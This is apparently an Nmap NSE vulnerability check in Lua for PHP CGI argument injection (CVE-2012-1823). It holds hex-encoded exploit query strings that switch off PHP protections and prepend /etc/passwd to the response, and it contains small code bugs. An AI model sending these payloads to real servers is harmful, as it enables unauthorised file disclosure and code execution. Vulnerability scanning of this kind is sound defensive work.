local http = require "http"
local stdnse = require "stdnse"

description = [[Detects PHP CGI argument injection allowing source code disclosure and RCE (CVE-2012-1823, CVE-2012-2311).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""
    local php_version = nil

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
      php_version = server_banner:match("PHP/([%d%.]+)")
      if not php_version then
        local xpowered = banner_req.headers["x-powered-by"]
        if xpowered then
          local xp = type(xpowered) == "table" and xpowered[1] or xpowered
          php_version = xp:match("PHP/([%d%.]+)")
        end
      end
    end

    local cgi_paths = {
      {path = "/cgi-bin/php?%2dd+%64%6f%75%72%64", label = "cgi-bin php -d flag"},
      {path = "/cgi-bin/php5?%2dd+%64%6f%75%72%64", label = "cgi-bin php5 -d flag"},
      {path = "/cgi-bin/php-cgi?%2dd+%64%6f%75%72%64", label = "cgi-bin php-cgi -d flag"},
      {path = "/cgi-bin/php/?" .. string.char(0x2d, 0x73), label = "cgi-bin php -s flag"},
      {path = "/php-cgi/php-cgi.exe?%2dd+%64%6f%75%72%64", label = "php-cgi.exe -d flag"},
      {path = "/cgi-bin/php?%2d%69+%73%74%64%69%6e", label = "cgi-bin php -i flag"},
      {path = "/cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%31+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%30+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%31+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%2f%65%74%63%2f%70%61%73%73%77%64", label = "cgi-bin php ini injection"},
      {path = "/?-s", label = "query string -s flag"},
      {path = "/?%2dd+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%31+%2dd+%73%61%66%65%5f%6d%6f%64%65%3d%30+%2dd+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%31+%2dd+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2dd+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2dd+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%2f%65%74%63%2f%70%61%73%73%77%64", label = "query string ini injection"},
      {path = "/cgi-bin/php5?%2ds", label = "cgi-bin php5 -s flag"},
    }

    for _, cgi in ipairs(cgi_paths) do
      local req = http.get(host, port, cgi.path)
      if req and req.status then
        local body = req.body or ""
        if req.status < 400 then
          local indicators = {"<?php", "PHP Credits", "phpinfo", "allow_url_include", "safe_mode", "root:.*:0:0:", "daemon:", "HTTP_HOST"}
          for _, ind in ipairs(indicators) do
            if body:match(ind) then
              local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
              table.insert(findings, {path = cgi.path, label = cgi.label, status = req.status, indicator = ind, excerpt = excerpt})
              break
            end
          end
          if cgi.path:match("%-s") and (body:match("<?php") or body:match("echo") or body:match("\\$") or body:match("highlight")) then
            table.insert(findings, {path = cgi.path, label = cgi.label, status = req.status, indicator = "source disclosure", excerpt = body:sub(1, 80)})
          end
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2012-1823, CVE-2012-2311"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.version = php_version or "unknown"
      result.detail = ("PHP CGI argument injection confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (%s) -> HTTP %d, %s: %s"):format(f.path, f.label, f.status, f.indicator, f.excerpt)
      end
      if php_version and (php_version:match("5%.[34]") or php_version:match("5%.2")) then
        result.version_note = ("PHP %s is known vulnerable to CGI argument injection"):format(php_version)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2012-1823"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.version = php_version or "unknown"
    result.detail = "No PHP CGI argument injection detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2012-1823"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
